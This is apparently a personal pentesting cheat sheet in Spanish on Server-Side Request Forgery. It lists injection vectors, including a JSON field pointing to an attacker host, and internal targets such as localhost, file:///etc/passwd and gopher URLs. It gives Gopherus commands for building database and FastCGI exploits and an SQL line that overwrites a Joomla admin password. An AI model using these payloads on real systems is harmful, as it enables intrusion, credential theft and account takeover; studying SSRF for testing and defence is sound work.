_Server Side Request Forgery_ o _Falsificacion de peticiones del lado del servidor_. 
Se puede decir que encontramos esta vulnerabilidad cuando tenemos la capacidad de apuntar a archivos internos del servidor, realizando peticiones al localhost o a cualquier servicio web. Es decir, abusamos de la capacidad del servidor de hacer request.

-------
### Vectores de ataque

El vector de ataque mas comun es mediante un parametro en la url, pero tambien se puede de las siguientes maneras:
* _Json en el cuerpo_: {"image":"http://attacker/..."}
* _Headers_: Host, X-Forwarded-For, Referer, X-Api-Url, etc.
* _Cookies_ o campos de sesión si el backend los usa para construir requests.
* _Redirecciones / open-redirects_: forzar al servidor a seguir una URL interna.

Hay mas, pero ns si son tan utiles.

------------
### Tipos

**Clasico**: El servidor directamente devuelve la respuesta.
**Blind (Ciego)**: El servidor realiza la request, pero no muestra la respuesta (se detecta _poniendose en escucha_ con python/netcat o con Burp Collaborator). 

---
### Targets comunes

* `http://localhost`
- `http://internal-api/`
- `file:///etc/passwd` (a veces)
- `ftp://`, `gopher://`, `dict://` → para exfiltrar datos o RCE.

---
### SSRF -> Enumeracion de DBs
https://github.com/tarunkant/Gopherus
Con la herramienta _gopherus_, se puede intentar enumerar bases de datos, siempre y cuando **tengas el nombre de usuario de la db y no requiera contrasena.**

```bash
git clone https://github.com/tarunkant/Gopherus
chmod +x install.sh
sudo ./install.sh
```

**USO**: 
```bash
gopherus --exploit mysql
gopherus --exploit postgresql
gopherus --exploit fastcgi
```

![[Pasted image 20251215115539.png|820]]

INCLUSOOO, si se tienen los privilegios, se pueden modificar datos, por ejemplo, poniendo la siguiente query:
```SQL
USE joomla; update joomla_users set password='cGFzc3dvcmQxMjMK==' where username='site_admin';
```
